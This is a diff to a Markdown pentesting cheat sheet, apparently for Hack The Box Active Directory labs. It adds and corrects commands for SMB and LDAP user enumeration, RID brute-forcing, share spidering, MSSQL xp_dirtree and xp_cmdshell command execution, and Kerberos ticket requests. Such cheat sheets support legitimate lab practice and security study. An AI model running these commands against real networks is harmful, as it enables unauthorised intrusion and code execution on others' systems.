@@ -13,27 +13,54 @@ tags: [CheatSheet, windows]
 
 ---
 
+## User Enumeration
+
+```bash
+nxc smb 10.10.10.10 -u user -p password --users
+nxc smb 10.10.10.10 -u user -p password --rid-brute
+```
+
+```bash
+rpcclient $> enumdomusers
+```
+
 ## **SMB**
+
+Smb authentication.
 
 ```bash
 nxc smb 10.10.10.10 -u user -p password
 ```
 
+List shares
+
 ```bash
-nxc smb 10.10.10.10 -u user -p password --user --shares -M spider_plus
+nxc smb 10.10.10.10 -u user -p password --shares -M spider_plus
+```
+
+```bash
+smbclient -L 10.10.10.10 -U user -N
 ```
 
 ## **LDAP**
 
+Anonymous login
+
 ```bash
 ldapsearch -H 'ldap://htb.local/' -x -b "dc=htb,dc=local" '(objectClass=person)'
+```
+
+Creds
+
+```bash
+ldapsearch -x -H ldap://cicada.htb -D user@cicada.htb -w 'password' -b "DC=cicada,DC=htb"
 ```
 
 ## MSSQL
 
 ### XP_DIRTREE
 
-List a directory
+List a directory with `xp_dirtree`.
 
 ```shell
 exec master.sys.xp_dirtree 'c:\', 1, 1;
@@ -47,13 +74,13 @@ xp_dirtree \\10.10.10.10\share
 
 ### Command execution
 
-Check admin privileges 1=true=admin
+Check admin privileges: `1=true=admin`.
 
 ```bash
 SELECT is_srvrolemember('sysadmin');
 ```
 
-Enable `xp_cmdshell`
+Enable `xp_cmdshell` manually.
 
 ```bash
 EXEC sp_configure 'show advanced options', 1;
@@ -61,6 +88,8 @@ RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 ```
+
+Impacket auto-enable.
 
 ```bash
 enable_xp_cmdshell
@@ -77,7 +106,7 @@ nxc mssql manager.htb -u operator -p operator -x whoami
 ```
 
 ```bash
-nxc mssql domain.local -u user -p pass -q 'ELECT name FROM master.dbo.sysdatabases;'
+nxc mssql domain.local -u user -p pass -q 'SELECT name FROM master.dbo.sysdatabases;'
 ```
 
 ## **Attacking Kerberos**
@@ -119,7 +148,7 @@ getTGT.py 'domain.local/user' -dc-ip 10.10.11.45 -p 'password'
 ```
 
 ```bash
-nxc smb domain -u user -p password --generate-tgt
+nxc smb domain -u user -p password --generate-tgt user
 ```
 
 ## AD CS
